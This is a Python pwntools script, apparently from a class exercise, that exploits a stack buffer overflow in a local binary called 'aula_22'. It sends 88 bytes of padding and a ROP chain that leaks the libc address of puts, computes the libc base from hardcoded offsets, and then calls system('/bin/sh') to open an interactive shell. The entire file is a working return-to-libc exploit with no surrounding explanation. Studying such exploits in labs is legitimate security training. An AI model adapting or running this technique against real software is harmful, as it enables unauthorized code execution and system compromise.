#!/usr/bin/env python
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little') 

elf = ELF('aula_22')
#context.log_level = 'DEBUG'

##########[STAGE 1]##########
print('')
log.info('[Stage One]')

plt_puts = 0x401030
got_puts = 0x404018
main = elf.symbols['main']
pop_rdi_ret = 0x4011cb

log.success('pop rdi;ret: {}'.format(hex(pop_rdi_ret)))
log.success('got.puts: {}'.format(hex(got_puts)))
log.success('plt.puts: {}'.format(hex(plt_puts)))
log.success('main: {}'.format(hex(main)))

payload = ''
payload += 'A' * 88
payload += p64(pop_rdi_ret)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(main)

f = open("payload","w")
f.write(payload)

p = process("./aula_22")
p.recvline()
p.sendline(payload)
received = p.recvline()


leaked_puts_got = received[:8].strip().ljust(8,'\x00')
y = u64(leaked_puts_got)
addrs = hex(y)
leak = int(addrs,16)

log.success('Leaked @GLIBC:' +hex(leak))

##########[STAGE 2]##########
print('')
log.info('[Stage Two]')

offset_bin_sh =  0x181519 #strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
offset_system =  0x449c0  #readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
offset_puts = 0x71910     #readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_base = leak - offset_puts

system_addr = libc_base + offset_system
bin_sh_addr = libc_base + offset_bin_sh

payload = ''
payload += 'A' * 88
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.recvline()
p.sendline(payload)
p.interactive()




